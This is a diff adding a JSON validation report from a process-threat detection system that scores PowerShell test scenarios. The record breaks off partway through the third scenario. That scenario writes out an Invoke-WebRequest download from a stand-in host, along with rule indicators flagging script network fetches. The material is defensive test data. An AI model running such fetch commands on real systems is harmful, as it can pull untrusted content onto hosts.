@@ -1,0 +1,4599 @@
+{
+  "validation_run_id": "POWERSHELL-BATCH-65262F11",
+  "generated_at": 1791227453.2743077,
+  "total": 10,
+  "passed": 10,
+  "failed": 0,
+  "results": [
+    {
+      "scenario_id": "P1-01",
+      "scenario_name": "Benign PowerShell Get-Process",
+      "event_id": "1831eada-2863-44a3-87d1-a2cd437626f4",
+      "process": {
+        "pid": 992101,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -NoLogo -NoProfile -Command \"Get-Process\"",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 5,
+        "severity": "INFO",
+        "suspicious": false,
+        "reasons": [
+          "Security-relevant Windows utility observed"
+        ],
+        "indicators": [
+          "monitored_binary"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 1,
+        "timestamp": 1791227450.5974462
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.05170616,
+        "raw_score": -0.44829384,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 27.12,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992101,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0833811174,
+        "reconstruction_region": "UPPER_5_PERCENT",
+        "anomaly_confidence": 40.08,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96057036,
+          0.73528448,
+          0.95650763,
+          0.40733292
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "command_arg_count",
+            "actual_value": 5.0,
+            "reconstructed_value": 11.147267,
+            "scaled_squared_error": 0.52231697,
+            "absolute_original_difference": 6.147267
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 574.706598,
+            "scaled_squared_error": 0.50551339,
+            "absolute_original_difference": 454.706598
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.979951,
+            "scaled_squared_error": 0.2233714,
+            "absolute_original_difference": 4.979951
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 56.0,
+            "reconstructed_value": 249.507071,
+            "scaled_squared_error": 0.21507792,
+            "absolute_original_difference": 193.507071
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 12.964626,
+            "scaled_squared_error": 0.04512612,
+            "absolute_original_difference": 4.964626
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992101,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 5.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 33.6,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 27.12,
+          "autoencoder_score": 40.08,
+          "average_score": 33.6,
+          "consensus_score": 33.6,
+          "consensus_label": "NORMAL",
+          "agreement": "HIGH",
+          "agreement_difference": 12.96,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 33.6
+        },
+        "active_signals": [],
+        "strong_signals": [],
+        "active_signal_count": 0,
+        "strong_signal_count": 0,
+        "weighted_score": 14.01,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 13.5333,
+        "severity": "INFO",
+        "suspicious": false,
+        "should_alert": false,
+        "critical_allowed": false,
+        "evidence_confidence": "LOW",
+        "reasons": [],
+        "behavior_indicators": [
+          "monitored_binary"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [],
+        "strong_categories": [],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 13.5333,
+          "severity": "INFO",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LOW",
+          "available_category_count": 3,
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [],
+          "strong_categories": [],
+          "scores": {
+            "rules": 5.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 33.6,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 5.0,
+              "active": false,
+              "strong": false
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 33.6,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.12,
+            "autoencoder_score": 40.08,
+            "average_score": 33.6,
+            "consensus_score": 33.6,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 12.96,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": null,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 13.5333,
+          "active_weighted_score": 0.0,
+          "reasons": [],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 35,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 14.01,
+            "fusion_v2_severity": "INFO",
+            "fusion_v2_rule_score": 5.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 33.6,
+            "score_delta_v3_minus_v2": -0.47669999999999924
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 5.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 33.6,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.12,
+            "autoencoder_score": 40.08,
+            "average_score": 33.6,
+            "consensus_score": 33.6,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 12.96,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 33.6
+          },
+          "active_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "weighted_score": 14.01,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 14.01,
+          "severity": "INFO",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "NONE",
+          "reasons": [
+            "No detection category crossed its suspicious threshold."
+          ],
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 14.01,
+          "fusion_v2_severity": "INFO",
+          "fusion_v2_rule_score": 5.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 33.6,
+          "score_delta_v3_minus_v2": -0.47669999999999924
+        }
+      },
+      "feature_record_id": 35,
+      "detections": [],
+      "stored_detection_count": 0,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-02",
+      "scenario_name": "Benign PowerShell Get-Service",
+      "event_id": "04cb5124-5501-4aa5-b328-d32b10ba3a29",
+      "process": {
+        "pid": 992102,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -NoLogo -NoProfile -Command \"Get-Service\"",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 5,
+        "severity": "INFO",
+        "suspicious": false,
+        "reasons": [
+          "Security-relevant Windows utility observed"
+        ],
+        "indicators": [
+          "monitored_binary"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 2,
+        "timestamp": 1791227450.7698815
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.05170616,
+        "raw_score": -0.44829384,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 27.12,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992102,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0833811174,
+        "reconstruction_region": "UPPER_5_PERCENT",
+        "anomaly_confidence": 40.08,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96057036,
+          0.73528448,
+          0.95650763,
+          0.40733292
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "command_arg_count",
+            "actual_value": 5.0,
+            "reconstructed_value": 11.147267,
+            "scaled_squared_error": 0.52231697,
+            "absolute_original_difference": 6.147267
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 574.706598,
+            "scaled_squared_error": 0.50551339,
+            "absolute_original_difference": 454.706598
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.979951,
+            "scaled_squared_error": 0.2233714,
+            "absolute_original_difference": 4.979951
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 56.0,
+            "reconstructed_value": 249.507071,
+            "scaled_squared_error": 0.21507791,
+            "absolute_original_difference": 193.507071
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 12.964626,
+            "scaled_squared_error": 0.04512612,
+            "absolute_original_difference": 4.964626
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992102,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 5.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 33.6,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 27.12,
+          "autoencoder_score": 40.08,
+          "average_score": 33.6,
+          "consensus_score": 33.6,
+          "consensus_label": "NORMAL",
+          "agreement": "HIGH",
+          "agreement_difference": 12.96,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 33.6
+        },
+        "active_signals": [],
+        "strong_signals": [],
+        "active_signal_count": 0,
+        "strong_signal_count": 0,
+        "weighted_score": 14.01,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 13.5333,
+        "severity": "INFO",
+        "suspicious": false,
+        "should_alert": false,
+        "critical_allowed": false,
+        "evidence_confidence": "LOW",
+        "reasons": [],
+        "behavior_indicators": [
+          "monitored_binary"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [],
+        "strong_categories": [],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 13.5333,
+          "severity": "INFO",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LOW",
+          "available_category_count": 3,
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [],
+          "strong_categories": [],
+          "scores": {
+            "rules": 5.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 33.6,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 5.0,
+              "active": false,
+              "strong": false
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 33.6,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.12,
+            "autoencoder_score": 40.08,
+            "average_score": 33.6,
+            "consensus_score": 33.6,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 12.96,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": null,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 13.5333,
+          "active_weighted_score": 0.0,
+          "reasons": [],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 36,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 14.01,
+            "fusion_v2_severity": "INFO",
+            "fusion_v2_rule_score": 5.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 33.6,
+            "score_delta_v3_minus_v2": -0.47669999999999924
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 5.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 33.6,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.12,
+            "autoencoder_score": 40.08,
+            "average_score": 33.6,
+            "consensus_score": 33.6,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 12.96,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 33.6
+          },
+          "active_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "weighted_score": 14.01,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 14.01,
+          "severity": "INFO",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "NONE",
+          "reasons": [
+            "No detection category crossed its suspicious threshold."
+          ],
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 14.01,
+          "fusion_v2_severity": "INFO",
+          "fusion_v2_rule_score": 5.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 33.6,
+          "score_delta_v3_minus_v2": -0.47669999999999924
+        }
+      },
+      "feature_record_id": 36,
+      "detections": [],
+      "stored_detection_count": 0,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-03",
+      "scenario_name": "PowerShell Invoke-WebRequest",
+      "event_id": "10a376e2-da28-4aaa-832e-9aac82c7fff3",
+      "process": {
+        "pid": 992103,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -NoProfile -Command \"Invoke-WebRequest https://example.invalid/file.txt -OutFile C:\\Temp\\file.txt\"",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 30,
+        "severity": "LOW",
+        "suspicious": false,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: invoke-webrequest",
+          "Script or command interpreter contains a network URL in its command line"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:invoke-webrequest",
+          "script_network_reference"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 3,
+        "timestamp": 1791227450.9458544
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.04934324,
+        "raw_score": -0.45065676,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 27.73,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992103,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0665878705,
+        "reconstruction_region": "NORMAL_BASELINE",
+        "anomaly_confidence": 34.43,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96146869,
+          0.72789718,
+          0.95845548,
+          0.40928995
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 563.87804,
+            "scaled_squared_error": 0.4817231,
+            "absolute_original_difference": 443.87804
+          },
+          {
+            "feature": "command_arg_count",
+            "actual_value": 7.0,
+            "reconstructed_value": 11.686287,
+            "scaled_squared_error": 0.30354822,
+            "absolute_original_difference": 4.686287
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.953062,
+            "scaled_squared_error": 0.2209657,
+            "absolute_original_difference": 4.953062
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 113.0,
+            "reconstructed_value": 274.808691,
+            "scaled_squared_error": 0.15038545,
+            "absolute_original_difference": 161.808691
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 12.436283,
+            "scaled_squared_error": 0.03603241,
+            "absolute_original_difference": 4.436283
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992103,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 30.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 31.08,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 27.73,
+          "autoencoder_score": 34.43,
+          "average_score": 31.08,
+          "consensus_score": 31.08,
+          "consensus_label": "NORMAL",
+          "agreement": "VERY_HIGH",
+          "agreement_difference": 6.7,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 31.08
+        },
+        "active_signals": [],
+        "strong_signals": [],
+        "active_signal_count": 0,
+        "strong_signal_count": 0,
+        "weighted_score": 24.38,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 24.36,
+        "severity": "LOW",
+        "suspicious": false,
+        "should_alert": false,
+        "critical_allowed": false,
+        "evidence_confidence": "LOW",
+        "reasons": [],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:invoke-webrequest",
